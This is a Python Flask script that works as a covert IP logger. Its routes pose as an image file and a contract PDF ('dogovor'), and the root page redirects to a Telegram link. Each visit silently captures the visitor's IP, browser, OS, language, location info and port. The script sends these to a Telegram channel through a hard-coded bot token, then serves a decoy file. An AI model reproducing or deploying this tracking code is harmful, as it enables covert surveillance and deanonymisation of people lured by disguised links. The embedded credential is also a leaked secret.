import requests
from flask import Flask, redirect, send_from_directory, request
from flask_ipinfo import IPInfo

app: Flask = Flask(__name__)
ip_info: IPInfo = IPInfo()


def send_to_channel(text: str = None):
    """

    :type text: str
    """
    data = {
        "chat_id": "@dssdfkdsafkadsk",
        "text": text
    }
    url = "https://api.telegram.org/bot752649013:AAFKs7z5XqurSyjQ-kHblBqdKiVQEXG4yww/sendMessage?"
    requests.get(url=url, params=data)
    return True


def send_user_info(remote_port):
    text: str = f"Browser: {ip_info.browser}\nЯзык: {ip_info.lang}\nОС: {ip_info.os}\nIP: {ip_info.ipaddress}\n{ip_info.get_info}, PORT: {remote_port}"
    return send_to_channel(text)


@app.route('/', methods=['GET'])
def crib_form():
    remote_port = request.environ.get('REMOTE_PORT')
    send_user_info(remote_port=remote_port)
    return redirect("https://t.me/w22wme")


@app.route('/image.jpg', methods=['GET'])
def img_logger():
    uploads = 'logo.png'
    remote_port = request.environ.get('REMOTE_PORT')
    send_user_info(remote_port=remote_port)
    return send_from_directory(directory='.', filename=uploads)


@app.route('/dogovor.pdf', methods=['GET'])
def dogovor_logger():
    uploads = 'st-2013-117.pdf'
    remote_port = request.environ.get('REMOTE_PORT')
    send_user_info(remote_port=remote_port)
    return send_from_directory(directory='.', filename=uploads)


if __name__ == '__main__':
    app.run()
